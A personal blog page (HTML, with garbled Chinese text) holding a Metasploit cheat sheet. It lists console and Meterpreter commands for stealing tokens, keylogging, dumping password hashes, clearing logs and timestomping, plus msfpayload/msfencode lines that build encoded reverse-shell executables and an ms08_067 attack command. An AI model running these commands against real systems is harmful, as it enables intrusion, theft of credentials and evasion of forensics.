<!DOCTYPE html>
<html lang="zh-Hans">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="future.zhangyan">



    <meta name="description" content="æœªæ¥å¯æœŸ">



<title>Metasploit | Hexo</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    




	<!--åŠ¨æ€çº¿æ¡èƒŒæ™¯-->

<meta name="generator" content="Hexo 5.1.1"></head>

<body>
    <div class="wrapper">
        <header>
<link href="https://fonts.googleapis.com/icon?family=Material+Icons"
      rel="stylesheet">
	  <script type="text/javascript" src="C:/Users/zhangyan/Desktop/blog/themes/next/source/js"></script>

    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">å¼ è‰³&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                    <a class="menu-item" href="/book">Book</a>
                
                    <a class="menu-item" href="/bangumis">Bangumis</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
				<label for="switch_default" class="toggleBtn"></label>
         
				<div class="search bar7">
					<form id="search-form"> <!-- æœç´¢æ¡†ç›¸å…³ -->
						<input type="text" id="local-search-input" name="q" results="0" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off"/>
						<button type="submit" class="search-form-submit"></button>
						<i class="fa fa-times" onclick="resetSearch()"></i> <!-- æ¸…ç©º/é‡ç½®æœç´¢æ¡† -->
					</form>
					<div class="ins-section-wrapper">
						<div class="ins-section-container"></div>
					</div>
					<div id="local-search-result"></div> <!-- æœç´¢ç»“æœåŒº -->
						<p class='no-result'>No results found </p> <!-- æ— åŒ¹é…æ—¶æ˜¾ç¤ºï¼Œæ³¨æ„è¯·åœ¨ CSS ä¸­è®¾ç½®é»˜è®¤éšè— -->
					</div>


        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">å¼ è‰³&#39;s Blog</a><a id="mobile-toggle-theme">Â·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/categories">Categories</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                    <a class="menu-item" href="/book">Book</a>
                
                    <a class="menu-item" href="/bangumis">Bangumis</a>
                
            </div>


        </div>
    </nav>

</header>
<style type="text/css">
	* {
		box-sizing:border-box;
	}
	body {
		margin:0;
		padding:0;
		background-image:url(ydrzimages/p3.jpg);
		font-weight:500;
		font-family:"Microsoft YaHei","å®‹ä½“","Segoe UI","Lucida Grande",Helvetica,Arial,sans-serif,FreeSans,Arimo;
	}
	#container {
		width:500px;
		height:820px;
		margin:0 auto;
	}
	div.search {
		padding:10px 0;
		margin-left:200px
	}
	form {
		position:relative;
		width:300px;
		margin:0 auto;
	}
	input,button {
		border:none;
		outline:none;
	}
	input {
		width:100%;
		height:42px;
		padding-left:13px;
	}
	button {
		height:42px;
		width:42px;
		cursor:pointer;
		position:absolute;
	}
	/*æœç´¢æ¡†7*/
		  
	.bar7 form {
		height:42px;
	}
	.bar7 input {
		width:200px;
		border-radius:42px;
		border:2px solid #324B4E;
		transition:.3s linear;
		float:right;
	}
	.bar7 input:focus {
		width:300px;
	}
	.bar7 button {
		background:none;
		top:-2px;
		right:20px;
	}
	.bar7 button:before {
		content:"ç‚¹..";
		font-family:FontAwesome;
		color:#324b4e;
	}
	.no-result{
		display:none
	}
</style>

<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">Metasploit</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">future.zhangyan</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">October 6, 2019&nbsp;&nbsp;19:59:54</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">ç½‘ç»œå®‰å…¨</a>
                            
                        </span>
						<span id="/2019/10/06/Metasploit/" class="leancloud-visitors view" data-flag-title="Metasploit">
						  <em class="post-meta-item-text">Pageviews:</em>
						  <i class="leancloud-visitors-count"></i>
						</span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h2 id="msfçš„ä½¿ç”¨"><a href="#msfçš„ä½¿ç”¨" class="headerlink" title="msfçš„ä½¿ç”¨"></a>msfçš„ä½¿ç”¨</h2><p>Msfconsole:æ˜¯ä¸€ä¸ªä¸€ä½“åŒ–é›†ä¸­æ§åˆ¶å°ï¼Œå…è®¸ä½ è®¿é—®åˆ°å‡ ä¹æ‰€æœ‰çš„MSFæ¡†æ¶é€‰é¡¹**</p>
<hr>
<p>metasploitå°±æ˜¯ä¸€ä¸ªå…è´¹çš„æ¼æ´æ¡†æ¶ï¼Œåˆ©ç”¨ä»–äººäººéƒ½æ˜¯é»‘å®¢ï¼Œä½¿ç”¨è€…ä¸éœ€è¦ä»»ä½•ç¼–ç¨‹åŸºç¡€å°±å¯ä»¥ä½¿ç”¨</p>
<h3 id="checkï¼šæ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨"><a href="#checkï¼šæ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨" class="headerlink" title="checkï¼šæ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨"></a>checkï¼šæ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨</h3><h3 id="msfå¸¸ç”¨å‘½ä»¤"><a href="#msfå¸¸ç”¨å‘½ä»¤" class="headerlink" title="msfå¸¸ç”¨å‘½ä»¤:"></a>msfå¸¸ç”¨å‘½ä»¤:</h3><blockquote>
<p>show exploits</p>
<p>åˆ—å‡ºmetasploitæ¡†æ¶ä¸­çš„æ‰€æœ‰æ¸—é€æ”»å‡»æ¨¡å—ã€‚</p>
<p>show payloads</p>
<p>åˆ—å‡ºmetasploitæ¡†æ¶ä¸­çš„æ‰€æœ‰æ”»å‡»è½½è·ã€‚</p>
<p>show auxiliary</p>
<p>åˆ—å‡ºmetasploitæ¡†æ¶ä¸­çš„æ‰€æœ‰è¾…åŠ©æ”»å‡»è½½è·ã€‚</p>
<p>search name</p>
<p>æŸ¥æ‰¾metasploitæ¡†æ¶ä¸­æ‰€æœ‰çš„æ¸—é€æ”»å‡»å’Œå…¶ä»–æ¨¡å—ã€‚</p>
<p>info</p>
<p>å±•ç¤ºå‡ºåˆ¶å®šæ¸—é€æ”»å‡»æˆ–æ¨¡å—çš„ç›¸å…³ä¿¡æ¯ã€‚</p>
<p>use name</p>
<p>è£…è½½ä¸€ä¸ªæ¸—é€æ”»å‡»æˆ–æ¨¡å—ã€‚</p>
<p>LHOST</p>
<p>ä½ æœ¬åœ°å¯ä»¥è®©ç›®æ ‡ä¸»æœºè¿æ¥çš„IPåœ°å€ï¼Œé€šå¸¸å½“ç›®æ ‡ä¸»æœºä¸åœ¨åŒä¸€ä¸ªå±€åŸŸç½‘å†…æ—¶ï¼Œå°±éœ€è¦æ˜¯ä¸€ä¸ªå…¬å…±IPåœ°å€ï¼Œç‰¹åˆ«ä¸ºåå¼¹å¼shellä½¿ç”¨ã€‚</p>
<p>RHOST</p>
<p>è¿œç¨‹ä¸»æœºæˆ–æ˜¯ç›®æ ‡ä¸»æœºã€‚</p>
<p>set function</p>
<p>è®¾ç½®ç‰¹å®šçš„é…ç½®å‚æ•°ï¼ˆEGï¼šè®¾ç½®æœ¬åœ°æˆ–è¿œç¨‹ä¸»æœºå‚æ•°ï¼‰ã€‚</p>
<p>setg function</p>
<p>ä»¥å…¨å±€æ–¹å¼è®¾ç½®ç‰¹å®šçš„é…ç½®å‚æ•°ï¼ˆEGï¼šè®¾ç½®æœ¬åœ°æˆ–è¿œç¨‹ä¸»æœºå‚æ•°ï¼‰ã€‚</p>
<p>show options</p>
<p>åˆ—å‡ºæŸä¸ªæ¸—é€æ”»å‡»æˆ–æ¨¡å—ä¸­æ‰€æœ‰çš„é…ç½®å‚æ•°ã€‚</p>
<p>show targets</p>
<p>åˆ—å‡ºæ¸—é€æ”»å‡»æ‰€æœ‰æ”¯æŒçš„ç›®æ ‡å¹³å°ã€‚</p>
<p>set target num</p>
<p>æŒ‡å®šä½ æ‰€çŸ¥é“çš„ç›®æ ‡çš„æ“ä½œç³»ç»Ÿä»¥åŠè¡¥ä¸ç‰ˆæœ¬ç±»å‹ã€‚</p>
<p>set payload name</p>
<p>æŒ‡å®šæƒ³è¦ä½¿ç”¨çš„æ”»å‡»è½½è·ã€‚</p>
<p>show advanced</p>
<p>åˆ—å‡ºæ‰€æœ‰é«˜çº§é…ç½®é€‰é¡¹ã€‚</p>
<p>set autorunscript migrate -f.</p>
<p>åœ¨æ¸—é€æ”»å‡»å®Œæˆåï¼Œå°†è‡ªåŠ¨è¿ç§»åˆ°å¦ä¸€ä¸ªè¿›ç¨‹ã€‚</p>
<p>check</p>
<p>æ£€æµ‹ç›®æ ‡æ˜¯å¦é€‰å®šæ¸—é€æ”»å‡»å­˜åœ¨ç›¸åº”çš„å®‰å…¨æ¼æ´ã€‚</p>
<p>exploit</p>
<p>æ‰§è¡Œæ¸—é€æ”»å‡»æˆ–æ¨¡å—æ¥æ”»å‡»ç›®æ ‡ã€‚</p>
<p>exploit -j</p>
<p>åœ¨è®¡åˆ’ä»»åŠ¡ä¸‹è¿›è¡Œæ¸—é€æ”»å‡»ï¼ˆæ”»å‡»å°†åœ¨åå°è¿›è¡Œï¼‰ã€‚</p>
<p>exploit -z</p>
<p>æ¸—é€æ”»å‡»å®Œæˆåä¸ä¸å›è¯è¿›è¡Œäº¤äº’ã€‚</p>
<p>exploit -e encoder</p>
<p>åˆ¶å®šä½¿ç”¨çš„æ”»å‡»è½½è·ç¼–ç æ–¹å¼ï¼ˆEGï¼šexploit -e shikata_ga_naiï¼‰ã€‚</p>
<p>exploit -h</p>
<p>åˆ—å‡ºexploitå‘½ä»¤çš„å¸®åŠ©ä¿¡æ¯ã€‚</p>
<p>sessions -l</p>
<p>åˆ—å‡ºå¯ç”¨çš„äº¤äº’ä¼šè¯ï¼ˆåœ¨å¤„ç†å¤šä¸ªshellæ—¶ä½¿ç”¨ï¼‰ã€‚</p>
<p>sessions -l -v</p>
<p>åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„äº¤äº’ä¼šè¯ä»¥åŠè¯¦ç»†ä¿¡æ¯ï¼ŒEGï¼šæ”»å‡»ç³»ç»Ÿæ—¶ä½¿ç”¨äº†å“ªä¸ªå®‰å…¨æ¼æ´ã€‚</p>
<p>sessions -s script</p>
<p>åœ¨æ‰€æœ‰æ´»è·ƒçš„metasploitä¼šè¯ä¸­è¿è¡Œä¸€ä¸ªç‰¹å®šçš„metasploitè„šæœ¬ã€‚</p>
<p>sessions -K</p>
<p>æ€æ­»æ‰€æœ‰æ´»è·ƒçš„äº¤äº’ä¼šè¯ã€‚</p>
<p>sessions -c cmd</p>
<p>åœ¨æ‰€æœ‰æ´»è·ƒçš„metasploitä¼šè¯ä¸Šæ‰§è¡Œä¸€ä¸ªå‘½ä»¤ã€‚</p>
<p>sessions -u sessionID</p>
<p>å‡çº§ä¸€ä¸ªæ™®é€šçš„win32 shellåˆ°metasploit shellã€‚</p>
<p>db_create name</p>
<p>åˆ›å»ºä¸€ä¸ªæ•°æ®åº“é©±åŠ¨æ”»å‡»æ‰€è¦ä½¿ç”¨çš„æ•°æ®åº“ï¼ˆEGï¼šdb_create autopwnï¼‰ã€‚</p>
<p>db_connect name</p>
<p>åˆ›å»ºå¹¶è¿æ¥ä¸€ä¸ªæ•°æ®åº“é©±åŠ¨æ”»å‡»æ‰€è¦ä½¿ç”¨çš„æ•°æ®åº“ï¼ˆEGï¼šdb_connect user:passwd@ip/sqlnameï¼‰ã€‚</p>
<p>db_namp</p>
<p>åˆ©ç”¨nmapå¹¶æŠŠæ‰«ææ•°æ®å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼ˆæ”¯æŒæ™®é€šçš„nmapè¯­å¥ï¼ŒEGï¼š-sT -v -P0ï¼‰ã€‚</p>
<p>db_autopwn -h</p>
<p>å±•ç¤ºå‡ºdb_autopwnå‘½ä»¤çš„å¸®åŠ©ä¿¡æ¯ã€‚</p>
<p>db_autopwn -p -r -e</p>
<p>å¯¹æ‰€æœ‰å‘ç°çš„å¼€æ”¾ç«¯å£æ‰§è¡Œdb_autopwnï¼Œæ”»å‡»æ‰€æœ‰ç³»ç»Ÿï¼Œå¹¶ä½¿ç”¨ä¸€ä¸ªåå¼¹å¼shellã€‚</p>
<p>db_destroy</p>
<p>åˆ é™¤å½“å‰æ•°æ®åº“ã€‚</p>
<p>db_destroy userï¼špasswd@hostï¼šport/database</p>
<p>ä½¿ç”¨é«˜çº§é€‰é¡¹æ¥åˆ é™¤æ•°æ®åº“ã€‚</p>
</blockquote>
<h3 id="metasploitå‘½ä»¤"><a href="#metasploitå‘½ä»¤" class="headerlink" title="metasploitå‘½ä»¤"></a><strong><em>metasploitå‘½ä»¤</em></strong></h3><blockquote>
<p>help</p>
<p>æ‰“å¼€meterpreterä½¿ç”¨å¸®åŠ©ã€‚</p>
<p>run scriptname</p>
<p>è¿è¡Œmeterpreterè„šæœ¬ï¼Œåœ¨scripts/meterpreterç›®å½•ä¸‹å¯æŸ¥çœ‹åˆ°æ‰€æœ‰è„šæœ¬åã€‚</p>
<p>sysinfo</p>
<p>åˆ—å‡ºå—æ§ä¸»æœºçš„ç³»ç»Ÿä¿¡æ¯ã€‚</p>
<p>ls</p>
<p>åˆ—å‡ºç›®æ ‡ä¸»æœºçš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ä¿¡æ¯ã€‚</p>
<p>use priv</p>
<p>åŠ è½½ç‰¹æƒæå‡æ‰©å±•æ¨¡å—ï¼Œæ¥æ‰©å±•metasploitåº“ã€‚</p>
<p>ps</p>
<p>æ˜¾ç¤ºæ‰€æœ‰è¿è¡Œçš„è¿›ç¨‹ä»¥åŠç›¸å…³è”çš„ç”¨æˆ·è´¦æˆ·ã€‚</p>
<p>migrate PID</p>
<p>è¿ç§»åˆ°ä¸€ä¸ªæŒ‡å®šçš„è¿›ç¨‹IDï¼ˆPIDå·å¯é€šè¿‡pså‘½ä»¤ä»ä¸»æœºä¸Šè·å¾—ï¼‰ã€‚</p>
<p>use incognito</p>
<p>åŠ è½½incognitoåŠŸèƒ½ï¼ˆç”¨æ¥ç›—çªƒç›®æ ‡ä¸»æœºçš„ä»¤ç‰Œæˆ–å‡å†’ç”¨æˆ·ï¼‰</p>
<p>list_tokens -u</p>
<p>åˆ—å‡ºç›®æ ‡ä¸»æœºç”¨æˆ·çš„å¯ç”¨ä»¤ç‰Œã€‚</p>
<p>list_tokens -g</p>
<p>åˆ—å‡ºç›®æ ‡ä¸»æœºç”¨æˆ·ç»„çš„å¯ç”¨ä»¤ç‰Œã€‚</p>
<p>impersonate_token DOMAIN_NAME\USERNAME</p>
<p>å‡å†’ç›®æ ‡ä¸»æœºä¸Šçš„å¯ç”¨ä»¤ç‰Œã€‚</p>
<p>steal_token PID</p>
<p>ç›—çªƒç»™å®šè¿›ç¨‹çš„å¯ç”¨ä»¤ç‰Œå¹¶è¿›è¡Œä»¤ç‰Œå‡å†’ã€‚</p>
<p>drop_token</p>
<p>åœæ­¢å‡å†’å½“å‰ä»¤ç‰Œã€‚</p>
<p>getsystem</p>
<p>é€šè¿‡å„ç§æ”»å‡»å‘é‡æ¥æå‡ç³»ç»Ÿç”¨æˆ·æƒé™ã€‚</p>
<p>execute -f cmd.exe -i</p>
<p>æ‰§è¡Œcmd.exeå‘½ä»¤å¹¶è¿›è¡Œäº¤äº’ã€‚</p>
<p>execute -f cmd.exe -i -t</p>
<p>ä»¥æ‰€æœ‰å¯ç”¨ä»¤ç‰Œæ¥æ‰§è¡Œcmdå‘½ä»¤å¹¶éšè—è¯¥è¿›ç¨‹ã€‚</p>
<p>rev2self</p>
<p>å›åˆ°æ§åˆ¶ç›®æ ‡ä¸»æœºçš„åˆå§‹ç”¨æˆ·è´¦æˆ·ä¸‹ã€‚</p>
<p>reg command</p>
<p>åœ¨ç›®æ ‡ä¸»æœºæ³¨å†Œè¡¨ä¸­è¿›è¡Œäº¤äº’ï¼Œåˆ›å»ºï¼Œåˆ é™¤ï¼ŒæŸ¥è¯¢ç­‰æ“ä½œã€‚</p>
<p>setdesktop number</p>
<p>åˆ‡æ¢åˆ°å¦ä¸€ä¸ªç”¨æˆ·ç•Œé¢ï¼ˆè¯¥åŠŸèƒ½åŸºäºé‚£äº›ç”¨æˆ·å·²ç™»å½•ï¼‰ã€‚</p>
<p>screenshot</p>
<p>å¯¹ç›®æ ‡ä¸»æœºçš„å±å¹•è¿›è¡Œæˆªå›¾ã€‚</p>
<p>upload file</p>
<p>å‘ç›®æ ‡ä¸»æœºä¸Šä¼ æ–‡ä»¶ã€‚</p>
<p>download file</p>
<p>ä»ç›®æ ‡ä¸»æœºä¸‹è½½æ–‡ä»¶ã€‚</p>
<p>keyscan_start</p>
<p>é’ˆå¯¹è¿œç¨‹ç›®æ ‡ä¸»æœºå¼€å¯é”®ç›˜è®°å½•åŠŸèƒ½ã€‚</p>
<p>keyscan_dump</p>
<p>å­˜å‚¨ç›®æ ‡ä¸»æœºä¸Šæ•è·çš„é”®ç›˜è®°å½•ã€‚</p>
<p>keyscan_stop</p>
<p>åœæ­¢é’ˆå¯¹ç›®æ ‡ä¸»æœºçš„é”®ç›˜è®°å½•ã€‚</p>
<p>getprivs</p>
<p>å°½å¯èƒ½å¤šçš„è·å–ç›®æ ‡ä¸»æœºä¸Šçš„ç‰¹æƒã€‚</p>
<p>uictl enable keyboard/mouse</p>
<p>æ¥ç®¡ç›®æ ‡ä¸»æœºçš„é”®ç›˜å’Œé¼ æ ‡ã€‚</p>
<p>background</p>
<p>å°†ä½ å½“å‰çš„metasploit shellè½¬ä¸ºåå°æ‰§è¡Œã€‚</p>
<p>hashdump</p>
<p>å¯¼å‡ºç›®æ ‡ä¸»æœºä¸­çš„å£ä»¤å“ˆå¸Œå€¼ã€‚</p>
<p>use sniffer</p>
<p>åŠ è½½å—…æ¢æ¨¡å¼ã€‚</p>
<p>sniffer_interfaces</p>
<p>åˆ—å‡ºç›®æ ‡ä¸»æœºæ‰€æœ‰å¼€æ”¾çš„ç½‘ç»œç«¯å£ã€‚</p>
<p>sniffer_dump interfaceID pcapname</p>
<p>åœ¨ç›®æ ‡ä¸»æœºä¸Šå¯åŠ¨å—…æ¢ã€‚</p>
<p>sniffer_start interfaceID packet-buffer</p>
<p>åœ¨ç›®æ ‡ä¸»æœºä¸Šé’ˆå¯¹ç‰¹å®šèŒƒå›´çš„æ•°æ®åŒ…ç¼“å†²åŒºå¯åŠ¨å—…æ¢ã€‚</p>
<p>sniffer_stats interfaceID</p>
<p>è·å–æ­£åœ¨å®æ–½å—…æ¢ç½‘ç»œæ¥å£çš„ç»Ÿè®¡æ•°æ®ã€‚</p>
<p>sniffer_stop interfaceID</p>
<p>åœæ­¢å—…æ¢ã€‚</p>
<p>add_user username password -h ip</p>
<p>åœ¨è¿œç¨‹ç›®æ ‡ä¸»æœºä¸Šæ·»åŠ ä¸€ä¸ªç”¨æˆ·ã€‚</p>
<p>clearev</p>
<p>æ¸…æ¥šç›®æ ‡ä¸»æœºä¸Šçš„æ—¥å¿—è®°å½•ã€‚</p>
<p>timestomp</p>
<p>ä¿®æ”¹æ–‡ä»¶å±æ€§ï¼Œä¾‹å¦‚ä¿®æ”¹æ–‡ä»¶çš„åˆ›å»ºæ—¶é—´ï¼ˆåå–è¯è°ƒæŸ¥ï¼‰ã€‚</p>
<p>reboot</p>
<p>é‡å¯ç›®æ ‡ä¸»æœºã€‚</p>
</blockquote>
<h3 id="MSFpayloadå‘½ä»¤"><a href="#MSFpayloadå‘½ä»¤" class="headerlink" title="MSFpayloadå‘½ä»¤"></a><strong><em>MSFpayloadå‘½ä»¤</em></strong></h3><blockquote>
<p>msfpayload -h</p>
<p>msfpayloadçš„å¸®åŠ©ä¿¡æ¯ã€‚</p>
<p>msfpayload windows/meterpreter/bind_tcp O</p>
<p>åˆ—å‡ºæ‰€æœ‰windows/meterpreter/bind_tcpä¸‹å¯ç”¨çš„æ”»å‡»è½½è·çš„é…ç½®é¡¹ï¼ˆä»»ä½•æ”»å‡»è½½è·éƒ½æ˜¯å¯ç”¨é…ç½®çš„ï¼‰ã€‚</p>
<p>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT X &gt; payload.exe</p>
<p>åˆ›å»ºä¸€ä¸ªmetasploitçš„reverse_tcpæ”»å‡»è½½è·ï¼Œå›è¿åˆ°LHOSTipçš„LPORTï¼Œå°†å…¶ä¿å­˜ä¸ºåä¸ºpayload.exeçš„windowsä¸‹å¯æ‰§è¡Œç¨‹åºã€‚</p>
<p>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R &gt; payload.raw</p>
<p>åˆ›å»ºä¸€ä¸ªmetasploitçš„reverse_tcpæ”»å‡»è½½è·ï¼Œå›è¿åˆ°LHOSTipçš„LPORTï¼Œå°†å…¶ä¿å­˜ä¸ºåä¸ºpayload.rawï¼Œè¯¥æ–‡ä»¶åé¢çš„msffencodeä¸­ä½¿ç”¨ã€‚</p>
<p>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT C &gt; payload.c</p>
<p>åˆ›å»ºä¸€ä¸ªmetasploitçš„reverse_tcpæ”»å‡»è½½è·ï¼Œå¯¼å‡ºCæ ¼å¼çš„shellcodeã€‚</p>
<p>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT J &gt; payload.java</p>
<p>åˆ›å»ºä¸€ä¸ªmetasploitçš„reverse_tcpæ”»å‡»è½½è·ï¼Œå¯¼å‡ºæˆä»¥%uç¼–ç æ–¹å¼çš„javaScriptè¯­è¨€å­—ç¬¦ä¸²ã€‚</p>
</blockquote>
<h3 id="msfencodeå‘½ä»¤"><a href="#msfencodeå‘½ä»¤" class="headerlink" title="msfencodeå‘½ä»¤"></a><strong><em>msfencodeå‘½ä»¤</em></strong></h3><blockquote>
<p>mefencode -h</p>
<p>åˆ—å‡ºmsfencodeçš„å¸®åŠ©å‘½ä»¤ã€‚</p>
<p>msfencode -l</p>
<p>åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„ç¼–ç å™¨ã€‚</p>
<p>msfencode -t (c,elf,exe,java,is_le,js_be,perl,raw,ruby,vba,vbs,loop_vbs,asp,war,macho)</p>
<p>æ˜¾ç¤ºç¼–ç ç¼“å†²åŒºçš„æ ¼å¼ã€‚</p>
<p>msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe</p>
<p>ä½¿ç”¨shikata_ga_naiç¼–ç å™¨å¯¹payload.rawæ–‡ä»¶è¿›è¡Œ5ç¼–ç ï¼Œç„¶åå¯¼å‡ºä¸€ä¸ªåä¸ºencoded_payload.exeçš„æ–‡ä»¶ã€‚</p>
<p>msfpayload windows/meterpreter/bind_tcp LPORT=PORT R | msfencode -e x86/_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe</p>
<p>åˆ›å»ºä¸€ä¸ªç»è¿‡å¤šç§ç¼–ç æ ¼å¼åµŒå¥—ç¼–ç çš„æ”»å‡»è½½è·ã€‚</p>
<p>msfencode -i payload.raw BufferRegister=ESI -e x86/alpja_mixed -t c</p>
<p>åˆ›å»ºä¸€ä¸ªçº¯å­—æ¯æ•°å­—çš„shellcodeï¼Œç”±ESIå¯„å­˜å™¨åªæƒ³shellcodeï¼Œä»¥Cè¯­è¨€æ ¼å¼è¾“å‡ºã€‚</p>
</blockquote>
<h3 id="MSFcliå‘½ä»¤"><a href="#MSFcliå‘½ä»¤" class="headerlink" title="MSFcliå‘½ä»¤"></a><strong><em>MSFcliå‘½ä»¤</em></strong></h3><blockquote>
<p>msfcli | grep exploit</p>
<p>ä»…åˆ—å‡ºæ¸—é€æ”»å‡»æ¨¡å—ã€‚</p>
<p>msfcli | grep exploit/windows</p>
<p>ä»…åˆ—å‡ºä¸windowsç›¸å…³çš„æ¸—é€æ”»å‡»æ¨¡å—ã€‚</p>
<p>msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=PORT RHOST=IP E</p>
<p>å¯¹IPå‘èµ·ms08_067_netapiæ¸—é€æ”»å‡»ï¼Œé…ç½®äº†bind_tcpæ”»å‡»è½½è·ï¼Œå¹¶ç»‘å®šåœ¨PORTç«¯å£è¿›è¡Œç›‘å¬</p>
</blockquote>
<h2 id="å¦‚ä½•æ›´æ–°MSF"><a href="#å¦‚ä½•æ›´æ–°MSF" class="headerlink" title="å¦‚ä½•æ›´æ–°MSF"></a>å¦‚ä½•æ›´æ–°MSF</h2><h3 id="1ã€ğŸ±â€ğŸ‰ç›´æ¥åœ¨kaliå®˜ç½‘ä¸‹è½½æœ€æ–°ç‰ˆæœ¬ï¼Œä¸€ä¸ªæ˜ŸæœŸæ›´æ–°ä¸€æ¬¡ã€‚å®˜æ–¹åœ°å€ï¼šhttp-www-kali-org-downloads"><a href="#1ã€ğŸ±â€ğŸ‰ç›´æ¥åœ¨kaliå®˜ç½‘ä¸‹è½½æœ€æ–°ç‰ˆæœ¬ï¼Œä¸€ä¸ªæ˜ŸæœŸæ›´æ–°ä¸€æ¬¡ã€‚å®˜æ–¹åœ°å€ï¼šhttp-www-kali-org-downloads" class="headerlink" title="1ã€ğŸ±â€ğŸ‰ç›´æ¥åœ¨kaliå®˜ç½‘ä¸‹è½½æœ€æ–°ç‰ˆæœ¬ï¼Œä¸€ä¸ªæ˜ŸæœŸæ›´æ–°ä¸€æ¬¡ã€‚å®˜æ–¹åœ°å€ï¼šhttp://www.kali.org/downloads/"></a>1ã€ğŸ±â€ğŸ‰ç›´æ¥åœ¨kaliå®˜ç½‘ä¸‹è½½æœ€æ–°ç‰ˆæœ¬ï¼Œä¸€ä¸ªæ˜ŸæœŸæ›´æ–°ä¸€æ¬¡ã€‚å®˜æ–¹åœ°å€ï¼š<a target="_blank" rel="noopener" href="http://www.kali.org/downloads/">http://www.kali.org/downloads/</a></h3><p>kailä¸‹è½½åœ°å€ï¼š</p>
<p>[<strong><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1c05BnlI">https://pan.baidu.com/s/1c05BnlI</a></strong></p>
<p><a target="_blank" rel="noopener" href="http://cdimage.kali.org/kali-weekly/">http://cdimage.kali.org/kali-weekly/</a></p>
<p><a target="_blank" rel="noopener" href="http://sourceforge.net/projects/Metasploitable/files/Metasploitable2/">http://sourceforge.net/projects/Metasploitable/files/Metasploitable2/</a></p>
